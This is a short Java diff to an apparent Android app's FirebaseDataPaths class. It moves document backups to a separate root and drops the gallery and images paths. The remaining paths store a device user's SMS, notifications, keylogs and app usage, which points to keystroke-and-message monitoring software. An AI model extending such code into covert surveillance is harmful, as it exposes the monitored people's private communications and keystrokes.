@@ -16,12 +16,14 @@ import java.util.Map;
  *   sms/{id}/
  *   notifications/{id}/
  *   keylogs/{id}/
- *   gallery/{id}/
  *   app_usage/{id}/
  *   sync_status/{dataType}/
+ *
+ * File backups (all types): documents/{userId}/{docId} (RTDB) + Storage documents/{userId}/…
  */
 public final class FirebaseDataPaths {
     public static final String USER_DATA_ROOT = "user_data";
+    public static final String DOCUMENTS_ROOT = "documents";
 
     private FirebaseDataPaths() {
     }
@@ -58,20 +60,12 @@ public final class FirebaseDataPaths {
         return userData(userId).child("keylogs");
     }
 
-    public static DatabaseReference gallery(String userId) {
-        return userData(userId).child("gallery");
-    }
-
     public static DatabaseReference appUsage(String userId) {
         return userData(userId).child("app_usage");
     }
 
     public static DatabaseReference documents(String userId) {
-        return userData(userId).child("documents");
-    }
-
-    public static DatabaseReference images(String userId) {
-        return userData(userId).child("images");
+        return FirebaseDatabase.getInstance().getReference(DOCUMENTS_ROOT).child(userId);
     }
 
     public static DatabaseReference syncStatus(String userId) {
